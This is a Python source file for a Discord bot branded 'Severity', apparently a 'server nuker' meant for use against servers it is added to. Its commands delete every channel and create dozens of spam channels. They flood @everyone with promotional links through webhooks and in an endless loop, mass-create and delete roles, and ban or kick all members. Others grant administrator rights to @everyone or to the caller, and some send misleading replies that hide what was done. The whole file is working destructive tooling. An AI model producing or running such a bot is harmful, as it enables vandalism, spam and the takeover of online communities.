import discord
import os
import json
from discord.ext import commands
import asyncio
from colorama import Fore

with open('config.json', 'r') as f:
    config = json.load(f)
    token = config['token']

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"{bot.user} is awake!")

bot.remove_command("help")

@bot.command(name="help")
@commands.cooldown(1, 9, commands.BucketType.user)
async def custom_help(ctx):
    custom_color = 0x5564f1  

    embed = discord.Embed(
        title="Severity Commands",
        description="Here is a list of available commands and their descriptions:",
        color=custom_color  
    )

    for command in bot.commands:
        if command.help:
            embed.add_field(
                name=f"{bot.command_prefix}{command.name}",
                value=command.help,
                inline=False
            )
        else:
            embed.add_field(
                name=f"{bot.command_prefix}{command.name}",
                value="No description available.",
                inline=False
            )

    await ctx.send(embed=embed)

@bot.command()
async def serverlist(ctx):
    """
    List the servers the bot is in with their invite links.
    """
    embed = discord.Embed(
        title="Server List",
        description="Here is a list of servers I am in along with their invite links:",
        color=0x5564f1  
    )

    for guild in bot.guilds:
        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
        embed.add_field(
            name=guild.name,
            value=f"[Invite Link]({invite.url})",
            inline=False
        )

    await ctx.send(embed=embed)

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.user)
async def nuke(ctx):
    """
    Nuke the server.
    """
    await ctx.message.delete()
    await ctx.guild.edit(name="Severity Was Here")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    await asyncio.gather(*[ctx.guild.create_text_channel("Severity Was Here") for _ in range(35)])

    for channel in ctx.guild.text_channels:
        num_webhooks = 5  # change this to the # of webhooks you want
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"Severity{_}") 
            for _ in range(5):
                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/hooked/ , discord.gg/obscuralua")       
                await ctx.send("Nuking the server...")  

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        hex_color = int("0x5564f1", 16)
        cooldown_embed = discord.Embed(
            title="Cooldown",
            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```",
            color=hex_color)
        await ctx.reply(embed=cooldown_embed)
    else:
        raise error

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone star the fucking repository https://github.com/severityc/Discord-Server-Nuker , https://guns.lol/hooked/")


@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def rolespam(ctx):
    """
    Spam roles in the server.
    """
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name="wizzed by severity")
    """
    Spam roles in the server.
    """
    await ctx.send("Spamming roles...")

@bot.command()
@commands.cooldown(1, 50, commands.BucketType.user)
async def guildname(ctx, *, newname):
    """
    Change the server's name.
    """
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)
    await ctx.send(f"Changed the server name to {newname}")

@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def banall(ctx):
    """
    Mass ban all members in the server, skipping users with perms.
    """
    try:
        for member in ctx.guild.members:
            if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
                await member.ban(reason="Severity Was Here")
                print(Fore.GREEN + f"banned {member}")
            else:
                print(Fore.RED + f"skipping {member} due to permissions")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        await ctx.send("An error occurred while processing the command.")

    await ctx.send("pong 281ms")


@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def kickall(ctx):
    """
    Kick all members in the server.
    """
    try:
        for member in ctx.guild.members:
            await member.kick(reason="Severity Was Here")
            print(Fore.GREEN + f"kicked {member}")
    except:
        print(Fore.RED + f"cant kick {member}")
        await ctx.send("Kicking all members...")

@bot.command()
async def delroles(ctx):
    """
    Delete roles in the server.
    """
    await ctx.message.delete()

    roles_to_delete = [role for role in ctx.guild.roles]

    await asyncio.sleep(10)

    try:
        await asyncio.gather(*[role.delete(reason="Roles deleted by Severity") for role in roles_to_delete])
        print(Fore.GREEN + "All roles deleted successfully.")
    except Exception as e:
        print(Fore.RED + f"Error deleting roles: {e}")

    await ctx.send("Deleting roles completed.")

@bot.command()
async def give(ctx):
    """
    Give administrator permissions to everyone.
    """
    try:
        everyone_role = ctx.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions.all())
        await ctx.send("You do not have the required role to use this command.")
    except Exception as e:
        print(Fore.RED + f"Error giving administrator permissions: {e}")
        await ctx.send("An error occurred while processing the command.")

@bot.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def giveme(ctx, server_id: int):
    """
    Give administrator permissions to the user who executed the command.
    """
    try:
        guild = bot.get_guild(server_id)
        if guild:
            admin_role = await guild.create_role(name="Administrator", permissions=discord.Permissions.all(), reason="Created by command")
            
            member = guild.get_member(ctx.author.id)
            
            if member:
                await member.add_roles(admin_role, reason="Assigned by command")
                await ctx.send(f"Administrator permissions granted to {ctx.author.mention} in the server with ID {server_id}.")
            else:
                await ctx.send("Failed to grant administrator permissions. User not found in the server.")
        else:
            await ctx.send("Server not found.")
    except Exception as e:
        print(Fore.RED + f"Error granting administrator permissions: {e}")
        await ctx.send("An error occurred while processing the command.")

@bot.command()
async def removegive(ctx):
    """
    Remove all permissions from the @everyone role.
    """
    try:
        everyone_role = ctx.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions.none())
        await ctx.send("All permissions have been removed from the @everyone role.")
    except Exception as e:
        print(Fore.RED + f"Error removing permissions: {e}")
        await ctx.send("An error occurred while processing the command.")

bot.run(token)
